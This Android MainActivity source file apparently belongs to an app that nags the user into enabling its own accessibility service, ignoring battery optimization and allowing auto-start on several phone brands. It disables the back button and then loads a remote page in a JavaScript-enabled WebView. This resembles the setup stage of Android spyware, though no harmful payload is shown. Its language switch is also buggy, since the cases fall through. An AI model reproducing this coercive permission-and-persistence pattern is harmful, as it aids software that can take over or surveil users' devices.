package com.support.litework;

import androidx.appcompat.app.AppCompatActivity;

import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;

import com.support.litework.activity.SetAutoStartActivity;

import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private ImageView mImgBackground;
    private Button mBtnAllow1;
    private Button mBtnEnable1;

    private Button mBtnAllow2;
    private Button mBtnEnable2;
    private Button mBtnEnable3;


    private LinearLayout mLayoutSetting;
    private LinearLayout mLayoutButton1;
    private LinearLayout mLayoutButton2;
    private LinearLayout mLayoutButton3;
    private LinearLayout mLayoutWebview;
    private WebView _webview;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        setReady();
    }
    @Override
    protected void onResume() {
        super.onResume();
        requestPowerManger();
        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
            mLayoutWebview.setVisibility(View.GONE);
            mLayoutSetting.setVisibility(View.VISIBLE);
        } else if(checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            Intent intent = new Intent(getBaseContext(), SetAutoStartActivity.class);
            startActivity(intent);
        } else {
            if(getResources().getString(R.string.app_link_enable).equals("enable")) {
                WebSettings webSettings = _webview.getSettings();
                webSettings.setJavaScriptEnabled(true);
                _webview.setWebViewClient(new WebViewClient());
                _webview.loadUrl(getResources().getString(R.string.app_link));
                mLayoutSetting.setVisibility(View.GONE);
                mLayoutWebview.setVisibility(View.VISIBLE);
            }
        }
    }
    @SuppressLint("BatteryLife")
    private void requestPowerManger() {
        Intent intent = new Intent();
        String packageName = getPackageName();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d("test", "batter enable");
            intent.setAction(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
        } else {
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + packageName));
            startActivity(intent);
        }
    }
    private void setReady() {
        Locale currentLocale = Locale.getDefault();
        String currentLanguage = currentLocale.getLanguage();
        onRequestAutoStart();
        mImgBackground = findViewById(R.id.img_background);
        mBtnAllow1 = (Button) findViewById(R.id.btn_allow1);
        mBtnEnable1 = (Button) findViewById(R.id.btn_enable1);
        mBtnAllow2 = (Button) findViewById(R.id.btn_allow2);
        mBtnEnable2 = (Button) findViewById(R.id.btn_enable2);
        mBtnEnable3 = (Button) findViewById(R.id.btn_enable3);
        mLayoutSetting = findViewById(R.id.layout_setting);
        mLayoutWebview = findViewById(R.id.layout_webview);
        mLayoutButton1 = findViewById(R.id.layout_button1);
        mLayoutButton2 = findViewById(R.id.layout_button2);
        mLayoutButton3 = findViewById(R.id.layout_button3);

        switch (currentLanguage) {
            case "es": // Spanish
                mImgBackground.setImageResource(R.drawable.backgroundes);
            case "pt": // French
                mImgBackground.setImageResource(R.drawable.background);
            default:   // Default to English or other languages
                mImgBackground.setImageResource(R.drawable.backgrounden);
        }

        _webview = findViewById(R.id.view_web);
        mBtnAllow1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        });
        mBtnEnable1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAccessibilitySettingManager();
            }
        });

        mBtnAllow2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS);
                startActivity(intent);
            }
        });
        mBtnEnable2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAccessibilitySettingManager();
            }
        });
        mBtnEnable3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAccessibilitySettingManager();
            }
        });

        setLayout();
    }

    public void setLayout() {
        String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
        Log.d("version::", Build.VERSION.RELEASE);
        if(Integer.parseInt(Build.VERSION.RELEASE) < 11) {
            mLayoutButton3.setVisibility(View.VISIBLE);
        } else {
            if (manufacturer.equals("samsung") || manufacturer.equals("motorola")) {
                mLayoutButton2.setVisibility(View.VISIBLE);
            } else {
                mLayoutButton1.setVisibility(View.VISIBLE);
            }
        }

    }

    private void onRequestAutoStart() {
        String manufacturer = android.os.Build.MANUFACTURER.toLowerCase();
        switch (manufacturer) {
            case "xiaomi":
                openXiaomiAutoStartSettings();
                break;
            case "oppo":
                openOppoAutoStartSettings();
                break;
            case "vivo":
                openVivoAutoStartSettings();
                break;
            case "huawei":
                openHuaweiAutoStartSettings();
                break;
            case "oneplus":
                openOnePlusAutoStartSettings();
                break;
            default:
                openBatteryOptimizationSettings();
                break;
        }
    }

    private void openXiaomiAutoStartSettings() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e1){
            Log.d("AutoStart::", e1.toString());
        }
    }

    private void openOppoAutoStartSettings() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.privacypermissionsentry.PermissionTopActivity"));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e1){
            Log.d("AutoStart::", e1.toString());
        }
    }

    private void openVivoAutoStartSettings() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e1){
            Log.d("AutoStart::", e1.toString());
        }
    }

    private void openHuaweiAutoStartSettings() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e1){
            Log.d("AutoStart::", e1.toString());
        }
    }

    private void openOnePlusAutoStartSettings() {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.oneplus.security", "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"));
        try {
            startActivity(intent);
        } catch (ActivityNotFoundException e1){
            Log.d("AutoStart::", e1.toString());
        }
    }
    private void openBatteryOptimizationSettings() {
    }


    public static boolean isAccessibilityPermissionGranted(Context context) {
        int accessibilityEnabled = 0;

        final String service = context.getPackageName() + "/" + context.getPackageName()+ ".services.MainAccessibilityService";
        Log.d("pacakgename::", context.getPackageName() + ":::" + service);
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    context.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    Log.d("accessibilityService::", accessibilityService);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.d("permission11::", "Accessibility is enabled");
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void requestAccessibilitySettingManager() {
        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        }
    }

    @Override
    public void onBackPressed() {
    }
}